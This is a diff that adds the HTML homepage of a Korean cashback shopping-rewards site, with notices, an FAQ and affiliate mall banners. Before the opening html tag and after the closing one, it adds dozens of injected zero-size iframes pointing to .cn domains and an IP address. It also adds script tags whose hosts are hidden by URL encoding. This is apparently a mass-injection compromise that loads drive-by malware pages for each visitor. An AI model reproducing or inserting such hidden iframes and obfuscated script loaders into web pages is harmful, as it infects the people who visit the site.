@@ -1,0 +1,321 @@
+
+<iframe width=0 height=0 src=http://211.239.121.224/css/log.gif></iframe><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwu.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%31%2E%63%6E></script><iframe src=http://www.wrmfwu.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%31%2E%63%6E></script><iframe src=http://www.wrmfww.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe>
+<html>
+<head>
+<title>알캐쉬</title>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
+<link href="css/style.css" rel="stylesheet" type="text/css">
+<SCRIPT language=javascript src="js/activex_activate.js"></SCRIPT>
+<SCRIPT language=javascript src="js/link.js"></SCRIPT>
+<script>
+<!--
+function bluring(){
+if(event.srcElement.tagName=="A"||event.srcElement.tagName=="IMG")
+document.body.focus();
+}
+document.onfocusin=bluring;
+
+//-->
+</script>
+</head>
+<body class=main_bg>
+<table width="860" border="0" align="center" cellpadding="0" cellspacing="0">
+ <tr>
+  <td height="25" align="right" >
+  
+        <table width="77" border="0" cellspacing="0" cellpadding="0">
+            <tr> 
+                <td><a href="../member/login.asp"><img src="../img/top_menu1.gif" border="0"></a></td>
+                <td><a href="../member/regi1.asp"><img src="../img/top_menu2.gif" border="0"></a></td>
+            </tr>
+        </table>
+
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+    <tr>
+     <td width="180"><img src="img/logo.jpg" width="180" height="60"></td>
+     <td valign="bottom"><SCRIPT>fFlash_Activate('flash/savecash_menu.swf', '679', '56');</SCRIPT></td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+ <tr>
+  <td height="15"></td>
+ </tr>
+ <tr>
+  <td>
+   <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+    <tr>
+     <td valign="top" height = 169>
+         <SCRIPT>fFlash_Activate('flash/savecash_main_visual.swf', '860', '169');</SCRIPT>
+     </td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+ <tr>
+  <td style="padding:13 10 25 10">
+   <table width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+     <td width="376">
+      <table width="376" border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td colspan="2" style="padding-bottom:8"><a href="customer/notice.asp"><img src="img/main_title1.gif" width="376" height="34" border="0"></a></td>
+       </tr>
+
+       <tr>
+        <!--<td width="70" height="20" align="center">2007-09-18</td>-->
+        <td width="306"><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+            <tr>
+              <th align="left" scope="col"><a href="customer/view.asp?seq=35">알캐시 추천 이벤트</a></th>
+            </tr>
+          </table></td>
+       </tr>
+
+       <tr>
+        <!--<td width="70" height="20" align="center">2007-09-18</td>-->
+        <td width="306"><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+            <tr>
+              <th align="left" scope="col"><a href="customer/view.asp?seq=34">P2P 웹하드 적립센터 오픈</a></th>
+            </tr>
+          </table></td>
+       </tr>
+
+       <tr>
+        <!--<td width="70" height="20" align="center">2007-09-18</td>-->
+        <td width="306"><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+            <tr>
+              <th align="left" scope="col"><a href="customer/view.asp?seq=33">옥션 쇼핑몰 적립시 안내사항</a></th>
+            </tr>
+          </table></td>
+       </tr>
+
+       <tr>
+        <!--<td width="70" height="20" align="center">2007-09-18</td>-->
+        <td width="306"><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+            <tr>
+              <th align="left" scope="col"><a href="customer/view.asp?seq=32">알캐시 적립시 주의사항</a></th>
+            </tr>
+          </table></td>
+       </tr>
+
+      </table>
+      <table width="100" height="13" border="0" cellpadding="0" cellspacing="0">
+       <tr>
+        <td></td>
+       </tr>
+      </table>
+      <table width="376" border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td style="padding-bottom:8"><a href="customer/faq.asp"><img src="img/main_title2.gif" width="376" height="35" border="0"></a></td>
+       </tr>
+       <tr>
+        <td width="306" height="20"><a href="customer/faq.asp">알캐쉬는 어떤서비스인가요?</a></td>
+       </tr>
+       <tr>
+        <td height="20"><a href="customer/faq.asp">알캐쉬 프로그램 설치는 어떻게 하나요? </a></td>
+       </tr>
+       <tr>
+        <td height="20"><a href="customer/faq2.asp">적립금은 어떻게 쌓을 수 있나요?</a></td>
+       </tr>
+       <tr>
+        <td height="20"><a href="customer/faq3.asp">여러 개의 아이디를 가질 수 있나요? </a></td>
+       </tr>
+      </table>
+      <table width="100" height="13" border="0" cellpadding="0" cellspacing="0">
+       <tr>
+        <td></td>
+       </tr>
+      </table>
+      <table width="376" border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td rowspan="3"><img src="img/main_best10.gif" width="158" height="225"></td>
+        <td><img src="img/main_best_box1.gif" width="218" height="21"></td>
+       </tr>
+       <tr>
+        <td height="198" valign="top" background="img/main_best_box_bg.gif" style="padding:5 10 5 10">
+         <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=auction&m_num=130578&r_1=" target="_blank">옥션</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=gmarket&m_num=104292&r_1=" target="_blank">G마켓</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=interpark&m_num=107896&r_1=" target="_blank">인터파크</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=dnshop&m_num=114601&r_1=" target="_blank">디앤샵</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=nsseshop&m_num=112825&r_1=" target="_blank">농수산eshop</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=sism&m_num=108433&r_1=" target="_blank">삼성몰</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=onket&m_num=112962&r_1=" target="_blank">다음온켓</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=ddmclub&m_num=104978&r_1=" target="_blank">동대문닷컴</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+          <tr>
+           <td width="18" height="16"><img src="img/no1.gif" width="12" height="11" align="absmiddle"></td>
+           <td><table width="100%" border="0" cellspacing="0" cellpadding="0" style="table-layout:fixed">
+               <tr>
+                 <th align="left" scope="col"><a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=epost&m_num=125881&r_1=" target="_blank">우체국쇼핑</a></th>
+               </tr>
+             </table></td>
+          </tr>
+
+         </table>
+        </td>
+       </tr>
+       <tr>
+        <td height="6"><img src="img/main_best_box2.gif" width="218" height="6"></td>
+       </tr>
+      </table>
+     </td>
+     <td>&nbsp;</td>
+     <td width="439" valign="top">
+      <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td><img src="img/main_title3.gif" width="439" height="34"></td>
+       </tr>
+      </table>
+      <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td width="19" rowspan="3"><img src="img/main_event_box1.gif" width="19" height="463"></td>
+        <td><img src="img/main_event_box3.gif" width="401" height="16"></td>
+        <td width="19" rowspan="3" align="right"><img src="img/main_event_box2.gif" width="19" height="463"></td>
+       </tr>
+       <tr>
+        <td height="429" valign="top" bgcolor="F5F5F5">
+         <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><!--ilikeclick 광고물 소스 시작-->
+
+
+<a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=gmarket&m_num=120236&r_1=" target=_blank><img src="http://banner.interich.com/?pf_code=100092107596120236" border="0"></a>
+          </tr>
+          <tr>
+           <td height="6"></td>
+          </tr>
+          <tr>
+           <td>
+
+<a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=auction&m_num=130420&r_1=" target=_blank><img src="http://banner.interich.com/?pf_code=100034107596130420" border="0"></a>
+
+</td>
+          </tr>
+
+          <tr><td>
+
+<a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=sism&m_num=108392&r_1=" target=_blank><img src="http://banner.interich.com/?pf_code=100203107596108392" border="0"></a>
+</td></tr>
+
+          <tr><td>
+
+
+<a href="http://click.interich.com?a_id=rcashmall&a_num=1&m_id=gmarket&m_num=120043&r_1=" target=_blank><img src="http://banner.interich.com/?pf_code=100092107596120043" border="0"></a>
+</td></tr>
+
+         </table>
+
+
+        </td>
+       </tr>
+       <tr>
+        <td height="18"><img src="img/main_event_box4.gif" width="401" height="18"></td>
+       </tr>
+      </table>
+     </td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+</table>
+<table width="100%" height="85"  border="0" cellpadding="0" cellspacing="0" bgcolor="F5F5F5">
+ <tr>
+  <td align="center" valign="top" style="padding-top:15px">
+   <table width="840" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+     <td width="172" valign="top"><img src="img/bottom_logo.gif" width="123" height="33"></td>
+     <td width="22"><img src="img/bottom_bar.gif" width="1" height="53"></td>
+     <td valign="top">     
+      <table width="100" border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td><a href="etc/personal.asp"><img src="img/bottom_menu1.gif" width="79" height="12" border="0"></a></td>
+        <td><a href="etc/stipul.asp"><img src="img/bottom_menu2.gif" width="53" height="12" border="0"></a></td>
+        <td>&nbsp;</td>
+        <td><a href="etc/jehu.asp"><img src="img/bottom_menu4.gif" width="52" height="12" border="0"></a></td>
+       </tr>
+      </table>
+      <table width="238" border="0" cellspacing="0" cellpadding="0">
+       <tr>
+        <td height="12"></td>
+       </tr>
+       <tr>
+        <td><img src="img/bottom_copy.gif"></td>
+       </tr>
+      </table>
+     </td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+</table>
+</body>
+</html><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwi.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.wrmfwu.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%31%2E%63%6E></script><iframe src=http://www.wrmfwu.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%31%2E%63%6E></script><iframe src=http://www.wrmfww.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%34%2E%63%6E></script><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe>
